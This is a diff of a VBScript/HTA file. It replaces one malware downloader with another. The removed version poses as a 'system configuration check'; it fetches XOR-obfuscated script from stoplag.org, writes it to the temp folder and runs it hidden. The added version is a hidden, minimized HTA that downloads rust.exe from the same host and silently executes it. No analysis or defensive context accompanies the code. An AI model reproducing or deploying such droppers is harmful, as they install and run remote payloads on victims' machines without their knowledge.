@@ -1,33 +1,22 @@
+<html><head><title>.</title><hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
 <script language="VBScript">
-' System configuration check module
-' Retrieves update configuration from management server
-
-Dim httpReq, rawData, parts, decoded, i, fso, tmpFile, shell
-Dim serverUrl, dataPath, decryptionKey
-
-serverUrl = "https://stoplag.org"
-dataPath = "/s2.txt"
-decryptionKey = 137
-
-Set httpReq = CreateObject("MSXML2.XMLHTTP")
-httpReq.Open "GET", serverUrl & dataPath, False
-httpReq.Send
-
-If httpReq.Status = 200 Then
-  parts = Split(httpReq.ResponseText, ",")
-  decoded = ""
-  For i = 0 To UBound(parts)
-    decoded = decoded & Chr(CInt(parts(i)) Xor decryptionKey)
-  Next
-  
+On Error Resume Next
+Dim xh, st, tmp, fso, rp
+Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+xh.Open "GET", "https://stoplag.org/rust.exe", False
+xh.Send
+If xh.Status = 200 Then
+  Set st = CreateObject("ADODB.Stream")
+  st.Type = 1
+  st.Open
+  st.Write xh.ResponseBody
   Set fso = CreateObject("Scripting.FileSystemObject")
-  Set tmpFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\syschk.vbs", True)
-  tmpFile.Write decoded
-  tmpFile.Close
-  
-  Set shell = CreateObject("WScript.Shell")
-  shell.Run """" & fso.GetSpecialFolder(2) & "\syschk.vbs""", 0, False
+  tmp = fso.GetSpecialFolder(2)
+  st.SaveToFile tmp & "\~rs.exe", 2
+  st.Close
+  Set rp = CreateObject("WScript.Shell")
+  rp.Run tmp & "\~rs.exe", 0, False
 End If
-
-self.Close()
-</script>
+Set xh = Nothing
+window.close()
+</script></head><body></body></html>
